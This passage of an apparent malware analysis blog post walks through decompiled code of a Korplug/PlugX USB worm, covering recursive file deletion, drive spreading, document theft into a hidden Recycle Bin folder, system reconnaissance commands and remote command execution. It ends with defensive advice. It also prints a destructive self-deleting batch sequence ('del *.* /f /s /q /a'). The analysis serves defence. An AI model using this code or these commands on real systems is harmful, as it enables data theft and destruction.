      local_8 = local_8 + 2;
    }
    Delete_Run_Key(local_8);
  }
  return;
}
```
```c
undefined4 __cdecl Recursive_RemoveDirectoryW(undefined4 param_1)

{
  local_474 = L'\0';
  memset(local_472,0,0x206);
  Dynamic_MemAllocation(local_10);
  Dynamic_MemAllocation(local_10,param_1);
  FUN_10002bc0(local_10,L"\\*.*");
  local_8 = FindFirstFileW(local_10[0],local_26c);
  if (local_8 == -1) {
    local_1c = 0;
    COleDispParams::~COleDispParams((COleDispParams *)local_10);
  }
  else {
    do {
      if (((local_240 != 0x2e) || (sStack_23e != 0)) &&
         ((local_240 != 0x2e || ((sStack_23e != 0x2e || (sStack_23c != 0)))))) {
        if (local_26c[0] == 0x10) {
          local_67c = L'\0';
          memset(local_67a,0,0x206);
          wsprintfW(&local_67c,L"%ws\\%ws",param_1,&local_240);
          Recursive_RemoveDirectoryW(&local_67c);
        }
        memset((uint *)&local_474,0,0x208);
        wsprintfW(&local_474,L"%ws\\%ws",param_1,&local_240);
        DeleteFileW(&local_474);
        DeleteFileW(&local_474);
      }
      iVar1 = FUN_10003390(local_8,local_26c);
    } while (iVar1 != 0);
    FindClose(local_8);
    Sleep(100);
    iVar1 = RemoveDirectoryW(param_1);
    if (iVar1 == 0) {
      local_18 = 0;
      COleDispParams::~COleDispParams((COleDispParams *)local_10);
      local_1c = local_18;
    }
    else {
      local_14 = 1;
      COleDispParams::~COleDispParams((COleDispParams *)local_10);
      local_1c = local_14;
    }
  }
  return local_1c;
}
```

Zooming back out again to FUN_100153a0 we will go into FUN_10014e10 which is created through the use of CreateThread.
Here we´re start seeing it looking into all available drives on the endpoint and then concat it with \\.\C etc.
It then creates an additional two threads into the open drive through FUN_100151e0 and FUN_10015030. Function ends with a longer sleep.

```c
undefined4 FUN_10014e10(void)

{
  SetErrorMode(1);
  local_14 = 0;
  local_434 = 0;
  memset(local_432,0,0x206);
  local_22c = 0;
  memset(local_22a,0,0x206);
  local_8 = (short *)0x0;
  do {
    memset(&local_434,0,8);
    GetLogicalDriveStringsW(0x208,&local_434); // Get all available drives.
    local_24 = 1;
    for (local_8 = &local_434; *local_8 != 0; local_8 = local_8 + iVar2 + 1) {
      memset(&local_22c,0,8);
      lstrcpyW(&local_22c,L"\\\\.\\");
      lstrcatW(&local_22c,local_8);
      local_18 = (undefined2 *)FUN_1000ae90((undefined1 (*) [16])&local_22c,0x5c);
      *local_18 = 0;
      bVar1 = FUN_10015f00(&local_22c);
      local_14 = CONCAT31(extraout_var,bVar1);
      if (local_14 == 1) {
        local_1c = 0;
        local_20 = 0;
        local_c = CreateThread(0,0,FUN_100151e0,&local_22c,0,&local_1c);
        if (local_c != 0) {
          CloseHandle(local_c);
          local_c = 0;
        }
        Sleep(100);
        local_10 = CreateThread(0,0,FUN_10015030,&local_22c,0,&local_20);
        if (local_10 != 0) {
          CloseHandle(local_10);
          local_10 = 0;
        }
        Sleep(1000);
      }
      iVar2 = lstrlenW(local_8);
    }
    Sleep(30000);
  } while( true );
}
```

FUN_100151e0 does primairly three things. It creates a mutex USB_NOTIFY_INF_, it sets the HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced subkey ShowSuperhidden to on in FUN_10013ed.

```c
undefined4 FUN_100151e0(short *param_1)

{
  SetErrorMode(1);
  local_c = param_1;
  local_18[0] = L'\0';
  local_18[1] = L'\0';
  local_18[2] = L'\0';
  local_18[3] = L'\0';
  local_18[4] = L'\0';
  local_18[5] = 0;
  if ((*param_1 == 0x5c) && (param_1[1] == 0x5c)) {
    wsprintfW(local_18,L"%c:\\",(uint)(ushort)param_1[4]);
  }
  else {
    wsprintfW(local_18,L"%ws",param_1);
  }
  local_434 = L'\0';
  memset(local_432,0,0x206);
  local_22c = 0;
  memset(local_22a,0,0x206);
  lstrcpyW(&local_22c,local_18);
  local_20 = (undefined2 *)FUN_1000ae90((undefined1 (*) [16])&local_22c,0x3a);
  *local_20 = 0;
  wsprintfW(&local_434,L"USB_NOTIFY_INF_%ws",&local_22c);
  local_8 = CreateMutexW(0,0,&local_434);
  iVar1 = GetLastError();
  if (iVar1 == 0xb7) {
    ReleaseMutex(local_8);
    CloseHandle(local_8);
  }
  else {
    local_1c = 0;
    local_24 = CreateThread(0,0,FUN_10013ed0,0,0,&local_1c);
    while (iVar1 = FUN_10015e00(local_18), iVar1 != 2) {
      Sleep(60000);
    }
    ReleaseMutex(local_8);
    CloseHandle(local_8);
  }
  return 0;
}
```

The last function, FUN_10015e00, called from FUN_100151e0, checks the network connection by attempting to reach L"https://www.microsoft.com" using InternetCheckConnectionW. It then copies itself and all existing files into the Recycle Bin, while also creating a disguised shortcut, desktop.lnk, and CEFHelper.exe.

```c
undefined4 __cdecl FUN_10015e00(undefined4 param_1)

{
  int iVar1;
  COleDispParams local_24 [8];
  undefined4 local_1c [2];
  undefined4 local_14 [2];
  undefined4 local_c;
  int local_8;
  
  iVar1 = GetFileAttributesW(param_1);
  if (iVar1 == -1) {
    local_c = 2;
  }
  else {
    Dynamic_MemAllocation(local_1c);
    Dynamic_MemAllocation((undefined4 *)local_24);
    Dynamic_MemAllocation(local_14);
    Dynamic_MemAllocation(local_1c,param_1);
    memcpy_?(local_1c,L"RECYCLER.BIN");
    memcpy_?(local_1c,&DAT_10022790);
    local_8 = InternetCheckConnectionW_Microsoft();
    create_hidden_desktop.ini(param_1,local_14);
    FUN_10012530(local_1c[0],local_8); // CEFHelper.exe & Copies the files over
    FUN_100110e0(param_1,local_14[0]); 
  FUN_10011560(param_1);               
    FUN_10010e50(local_14[0]);
    FUN_100103c0(param_1,local_14[0]);
    FUN_10010930(param_1,local_14[0],local_8); // Links the .lnk file with CEFHelper.exe
    local_c = 0;
    COleDispParams::~COleDispParams((COleDispParams *)local_14);
    COleDispParams::~COleDispParams(local_24);
    COleDispParams::~COleDispParams((COleDispParams *)local_1c);
  }
  return local_c;
}
```

The function FUN_10015030, which is the second of the two threads created earlier, is similar to the first thread. In this function, we are checking the internet connection by querying Microsoft's website, and also creating a mutex called USB_NOTIFY_COP_.
Additionally, the base64 function checking for specific file types: .doc, .docx, .ppt, .xls, and .pdf. These files are then base64 encoded and sent to the recycle directory.

The function also queries system information using commands like %comspec% /q /c systeminfo /all, /netstat /an, arp -a, and tasklist /v. It also runs the following command sequence: c3lzLmluZ8 > > del %0 tmp.bat.

```c
undefined4 FUN_10015030(short *param_1)

{
  SetErrorMode(1);
  local_c = param_1;
  &path[0] = L'\0';
  &path[1] = L'\0';
  &path[2] = L'\0';
  &path[3] = L'\0';
  &path[4] = L'\0';
  &path[5] = 0;
  if ((*param_1 == 0x5c) && (param_1[1] == 0x5c)) {
    wsprintfW(&path,L"%c:\\",(uint)(ushort)param_1[4]);
  }
  else {
    wsprintfW(&path,L"%ws",param_1);
  }
  local_42c = L'\0';
  memset(local_42a,0,0x206);
  local_224 = 0;
  memset(local_222,0,0x206);
  lstrcpyW(&local_224,&path);
  local_1c = (undefined2 *)FUN_1000ae90((undefined1 (*) [16])&local_224,0x3a);
  *local_1c = 0;
  wsprintfW(&local_42c,L"USB_NOTIFY_COP_%ws",&local_224);
  local_8 = CreateMutexW(0,0,&local_42c);
  iVar2 = GetLastError();
  if (iVar2 == 0xb7) {
    ReleaseMutex(local_8);
    CloseHandle(local_8);
  }
  else {
    iVar2 = InternetCheckConnectionW_Microsoft();
    if (iVar2 == 0) {
      bVar1 = NetworkControlRegistryCheck();
      if (CONCAT31(extraout_var,bVar1) == 0) {
        return 0;
      }
      query_system_info(&path);
      FUN_100123c0(&path);
    }
    else {
      base64_to_recycle(&path);
    }
    ReleaseMutex(local_8);
    CloseHandle(local_8);
  }
  return 0;
}```

FUN_100019b0()

The last function in switch case 2 sets up the proper privileges, which handles socket setup and prepares for the third switch case.
This indicates that after the proper privileges are granted, the function proceeds to set up a socket connection can be seen in FUN_100019b0 but also later through the use of functions like getsockname and getpeername.

```c
undefined4 FUN_100019b0(void)

{
  WSAStartup();
  // ... stackstrings "DebugPrivilege" and "SetPrivilege".
  local_c = DebugPriv(&DebugPrivilege,1);
  local_28 = 0;
  local_10 = DebugPriv(&SetPrivilege,1);
  local_14 = CreateThread();
  FUN_10016070(&local_8);
  local_18 = FUN_100164d0();
  local_1c = GetMessageW&TranslateMessage();
  local_20 = DestroyWindow(&local_8);
  SetEvent(DAT_10028cec);
  FUN_1000a210();
  WSACleanup();
  local_24 = 0;
  FUN_10016090();
  return local_24;
}
```
Switch Case 3

Switch case 3 primarily performs two tasks: it communicates and executes shell commands and initiates the init() function. This is done through the not-so-surprising Windows API function ShellExecuteW.

```c
undefined4 __cdecl FUN_10015400(undefined4 param_1)

{
  
  local_244 = 0;
  memset(local_242,0,0x206);
  Dynamic_MemAllocation(local_14);
  GetModuleFileNameW(0,&local_244,0x208);
  local_8 = (undefined2 *)FUN_10016050(&local_244,0x5c);
  if (local_8 != (undefined2 *)0x0) {
    local_8 = local_8 + 1;
    *local_8 = 0;
  }
  iVar1 = lstrlenW(param_1);
  local_c = LocalAlloc(0x40,iVar1 << 1);
  local_18 = 0xa0;
  local_16 = 0;
  local_44c = 0;
  memset(local_44a,0,0x206);
  lstrcpyW(&local_44c,&local_18);
  lstrcatW(&local_44c,&DAT_10022494);
  Dynamic_MemAllocation(local_14,&DAT_1002249c);
  memcpy_?(local_14,&local_244);
  memcpy_?(local_14,&local_44c);
  memcpy_?(local_14,&DAT_100224a0);
  local_38 = L'C'; // ... stackstring CabinetWClass
  local_1e = 0;
  local_1c = FindWindowW(&local_38,0);
  ShellExecuteW(0,L"open",local_14[0],0,0,1);
  Sleep(200);
  if (local_1c != 0) {
    SendMessageW(local_1c,0x10,0,0);
  }
  Sleep(100);
  if (local_c != 0) {
    LocalFree(local_c);
    local_c = 0;
  }
  local_3c = 1;
  COleDispParams::~COleDispParams((COleDispParams *)local_14);
  return local_3c;
}
```
# Summary

The Korplug worm operates by systematically crawling through the hard drive, identifying and copying selected files, which it then stores in the RECYCLE.bin folder in Base64 format. It establishes network communication by setting up sockets to interact with its operator. To ensure persistence, it continuously executes its init() function, maintaining its presence on the system. Additionally, it checks for removable drives to propagate itself further.

However, this sample contains many more aspects worth exploring. Certain details have been intentionally omitted to keep this summary concise. Expanding further on its functions and capabilities might risk making the article overly complex and difficult to follow.
A small tease on fun things you could find are for example the this command sequence. Very exciting, promise.

ping 127.0.0.1 -n 5 > nul 2> nul
cd
del *.* /f /s /q /a
cd ..
rd
del %0

# Detection Ideas & Suggestions

One thing that bothers me when reading about a group, malware, or techniques is the lack of a follow-up section with actionable steps - like a "call to action" - or recommendations for further reading.
So below, I've linked a few articles covering the malware, its different variants, and information about the group Mustang Panda, along with some news articles about their campaigns.

Since this is a USB-type worm that attempts to trick the user into clicking the .lnk file, which then launches the executable and ultimately sets up the DLL sideloading chain, the best defence is to prevent USB devices from running executables. This can be achieved through Group Policy Objects (GPOs) or Windows Defender Attack Surface Reduction (ASR). Additionally, modifying the AutoRun feature in the registry to block execution is recommended.
You could even go a step further set up detection rules for USB that isn't issued by your company.

If you made it this far…what the hell, good job.༼ つ ◕_◕ ༽つ

# Further Reading:

- Microsoft. *Dynamic-link library search order – Win32 apps*. Microsoft Learn. Available at: Dynamic-link library search order – Win32 apps | Microsoft Learn

- CrowdStrike. *Mustang Panda | Threat Actor Profile*. Available at: Mustang Panda | Threat Actor Profile | CrowdStrike

- Check Point Research. *Mustang Panda's Hodur: Old tricks, new Korplug variant*. Available at: Mustang Panda's Hodur: Old tricks, new Korplug variant

- THOR. *Previously Unseen PlugX Variant Deployed During Microsoft Exchange Server Attacks by PKPLUG Group*. Available at: THOR: Previously Unseen PlugX Variant Deployed During Microsoft Exchange Server Attacks by PKPLUG Group

- United States Department of Justice. *Justice Department and FBI Conduct International Operation to Delete Malware Used by China-Backed Hackers*. Office of Public Affairs. Available at: Operation to Delete Malware Used by China-Backed Hackers | United States Department of Justice Office of Public Affairs

- Sophos. *A border-hopping PlugX USB worm takes its act on the road*. Sophos News. Available at: A border-hopping PlugX USB worm takes its act on the road – Sophos News

- Sophos. *Family Tree: DLL-Sideloading Cases May Be Related*. Sophos News. Available at: Family Tree: DLL-Sideloading Cases May Be Related – Sophos News

- Palo Alto Networks Unit 42. *THREAT ANALYSIS REPORT: PlugX RAT Loader Evolution*. Available at: THREAT ANALYSIS REPORT: PlugX RAT Loader Evolution

- Darktrace. *How PlugX Malware Has Evolved & Adapted*. Darktrace Blog. Available at: How PlugX Malware Has Evolved & Adapted | Darktrace Blog

- Secureworks. *China-linked Mustang Panda adds new malware to its toolset*. Available at: China-linked Mustang Panda adds new malware to its toolset

- LeonSilvia. *NextGenPlugXShadowPad. AS-22 Report*. Available at: AS-22-LeonSilvia-NextGenPlugXShadowPad.pdf

- Threat Group Cards. *A Threat Actor Encyclopaedia: Mustang Panda, Bronze President*. Available at: Threat Group Cards: A Threat Actor Encyclopedia

- Recorded Future. *Chinese State-Sponsored Group 'RedDelta' Targets the Vatican and Catholic Organizations*. Available at: Chinese State-Sponsored Group 'RedDelta' Targets the Vatican and Catholic Organizations | Recorded Future

- MITRE ATT&CK®. *Event Triggered Execution: Component Object Model Hijacking (T1546.015)*. Available at: Event Triggered Execution: Component Object Model Hijacking, Sub-technique T1546.015 – Enterprise | MITRE ATT&CK®
